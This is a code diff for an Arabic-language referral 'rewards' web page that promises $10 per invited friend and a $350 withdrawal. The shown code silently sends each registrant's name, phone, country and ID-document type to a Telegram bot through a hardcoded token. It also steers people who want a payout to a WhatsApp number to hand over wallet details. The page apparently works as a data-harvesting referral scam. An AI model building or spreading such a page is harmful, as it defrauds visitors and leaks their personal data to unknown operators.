@@ -13,27 +13,6 @@
         :root { --primary: #22c55e; --gold: #fbbf24; --bg: #020617; --card: rgba(15, 23, 42, 0.9); --border: rgba(51, 65, 85, 0.5); }
         body { margin:0; font-family: 'Tajawal', sans-serif; background: var(--bg); color: #fff; background-image: radial-gradient(circle at top right, #1e293b 0%, #020617 60%); background-attachment: fixed; line-height: 1.6; padding-bottom: 100px; text-align: right; }
         .container { max-width: 600px; margin: 0 auto; padding: 20px; }
-        <div class="glass-card" style="border: 1px solid var(--gold); background: linear-gradient(135deg, rgba(251, 191, 36, 0.1), rgba(2, 6, 23, 0.9));">
-    <div class="section-title" style="color: var(--gold);">
-        <i class="fas fa-rocket"></i> طريقك لتحقيق أول 350$
-    </div>
-    
-    <div style="margin-bottom: 15px;">
-        <p style="font-size: 1.1rem; color: #fff; font-weight: 700; margin-bottom: 8px;">
-            اربح <span style="color: var(--primary); font-size: 1.4rem;">10$ نقدية</span> عن كل صديق!
-        </p>
-        <p style="font-size: 0.9rem; color: #94a3b8; line-height: 1.4;">
-            نظامنا يمنحك مكافأة فورية بمجرد تسجيل أي شخص عبر رابطك. كلما شاركت أكثر، زادت أرباحك في المحفظة تلقائياً.
-        </p>
-    </div>
-
-    <div class="info-box" style="background: rgba(34, 197, 94, 0.1); border-right: 4px solid var(--primary); padding: 10px;">
-        <p style="color: #fff; font-size: 0.85rem;">
-            <i class="fas fa-magic" style="color: var(--gold);"></i> 
-            <b>مشاركة بضغطة واحدة:</b> لا حاجة لنسخ النصوص، اختر أيقونة التواصل بالأسفل لنشر رابطك فوراً في المجموعات والحالات.
-        </p>
-    </div>
-</div>
         .glass-card { background: var(--card); backdrop-filter: blur(10px); border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .section-title { color: var(--primary); font-size: 1.3rem; font-weight: 900; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
  
@@ -76,6 +55,12 @@
         <p style="color:#94a3b8;">أكبر منصة مكافآت وتداول في الوطن العربي</p>
     </div>
 
+    <div id="promo-section" style="display: none;" class="glass-card">
+        <div class="section-title" style="color: var(--gold);"><i class="fas fa-rocket"></i> طريقك لتحقيق أول 350$</div>
+        <p style="font-size: 1.1rem; color: #fff; font-weight: 700; margin-bottom: 8px;">اربح <span style="color: var(--primary); font-size: 1.4rem;">10$ نقدية</span> عن كل صديق!</p>
+        <p style="font-size: 0.85rem; color: #94a3b8; margin-bottom: 10px;">استخدم أزرار المشاركة بالأسفل لنشر رابطك تلقائياً في المجموعات والحالات بنقرة واحدة.</p>
+    </div>
+
     <div id="persistent-ref" class="glass-card">
         <div class="section-title"><i class="fas fa-wallet"></i> محفظة الإحالة الخاصة بك</div>
         <p style="font-size: 0.9rem; margin-bottom: 10px;">مرحباً بك: <b id="user-display-name" style="color:var(--primary)">...</b></p>
@@ -100,6 +85,8 @@
             <a href="#" onclick="shareTo('copy')" class="share-btn" style="color:var(--gold)"><i class="fas fa-copy"></i> نسخ الإعلان</a>
             <a href="#" onclick="copyLinkOnly()" class="share-btn" style="color:#fff; grid-column: span 2;"><i class="fas fa-link"></i> نسخ الرابط</a>
         </div>
+
+        <button class="btn-main" style="margin-top: 15px; background: linear-gradient(135deg, var(--gold), #d97706);" onclick="withdrawProfits()">💰 سحب الأرباح</button>
     </div>
 
     <div class="glass-card">
@@ -160,7 +147,6 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js";
     import { getFirestore, doc, setDoc, getDoc, collection, query, where, onSnapshot } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-firestore.js";
 
-    // إعدادات البوت من متغيرات البيئة (سيقوم نظام البناء الخاص بك باستبدالها)
     const TG_TOKEN = "7726590390:AAHN8mO9tIat1V3E2E9P7f3M3C4A5n9z8YI"; 
     const TG_CHAT_ID = "5076412792"; 
 
@@ -185,6 +171,9 @@
 
     const systemSettings = {
         inviteCount: 0,
+        currentBalance: 0, // متغير لتتبع الرصيد الحالي برمجياً
+        MIN_WITHDRAW: 350, // الحد الأدنى للسحب
+        SUPPORT_WA: "967739399064", // رقم الدعم
         getRewardAmount: function() {
             if (this.inviteCount >= 40) return 0;
             if (this.inviteCount >= 20) return 5;
@@ -214,7 +203,6 @@
                 country: countryData.name, date: new Date().toISOString()
             });
 
-            // إشعار تيليجرام التلقائي
             const tgMsg = `🎉 تسجيل جديد!\n👤 الاسم: ${nameInput}\n📞 الهاتف: ${phone}\n🌍 الدولة: ${countryData.name}\n📄 الوثيقة: ${docType}\n🔗 كود الإحالة: ${userUID}\n✅ بواسطة: ${refBy}`;
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`).catch(() => {});
 
@@ -233,6 +221,7 @@
                     document.getElementById("user-display-name").innerText = data.name;
                     document.getElementById("mainRefLink").innerText = window.location.origin + window.location.pathname + "?ref=" + data.myRefCode;
                     document.getElementById("persistent-ref").style.display = "block";
+                    document.getElementById("promo-section").style.display = "block"; // إظهار قسم التحفيز عند تسجيل الدخول
                     document.getElementById("registration-section").style.display = "none";
                     
                     const q = query(collection(db, "users"), where("referredBy", "==", data.myRefCode));
@@ -240,10 +229,13 @@
                         const count = snapshot.size;
                         systemSettings.inviteCount = count;
                         document.getElementById("ref-count").innerText = count;
+                        
                         let totalEarnings = 0;
                         if (count <= 20) totalEarnings = count * 10;
                         else if (count <= 40) totalEarnings = (20 * 10) + ((count - 20) * 5);
                         else totalEarnings = (20 * 10) + (20 * 5);
+                        
+                        systemSettings.currentBalance = totalEarnings; // تحديث الرصيد في الكائن الرئيسي
                         document.getElementById("balance-value").innerText = totalEarnings + "$";
                     });
                 }
@@ -251,6 +243,18 @@
         }
     };
     init();
+
+    // دالة سحب الأرباح المضافة
+    window.withdrawProfits = () => {
+        const balance = systemSettings.currentBalance;
+        if (balance < systemSettings.MIN_WITHDRAW) {
+            alert(`❌ عذرًا، رصيدك الحالي (${balance}$) أقل من الحد الأدنى للسحب وهو ${systemSettings.MIN_WITHDRAW}$. حاول زيادته عبر دعوة المزيد من الأصدقاء.`);
+        } else {
+            const msg = `✅ مبروك! يمكنك الآن سحب أرباحك البالغة (${balance}$)\nيرجى التواصل مع الدعم عبر واتساب لإتمام عملية السحب وتزويدنا بتفاصيل محفظتك.`;
+            alert(msg);
+            window.open(`https://wa.me/${systemSettings.SUPPORT_WA}?text=${encodeURIComponent("أهلاً إدارة النظام، لقد وصلت للحد الأدنى للسحب برصيد " + balance + "$ وأريد سحب أرباحي.")}`, '_blank');
+        }
+    };
 
     window.shareTo = (platform) => {
         const link = document.getElementById("mainRefLink").innerText;
@@ -282,7 +286,7 @@
             msg = `مرحباً إدارة المكافآت،\nدخلت للموقع وأريد الاستفسار عن كيفية الحصول على بونص 30$ ونظام الإحالة. ما هي الخطوات؟`;
         }
         
-        window.open(`https://wa.me/967739399064?text=${encodeURIComponent(msg)}`, '_blank');
+        window.open(`https://wa.me/${systemSettings.SUPPORT_WA}?text=${encodeURIComponent(msg)}`, '_blank');
     };
 
     setInterval(() => {
@@ -293,4 +297,4 @@
     }, 18000);
 </script>
 </body>
-</html>
+            </html>
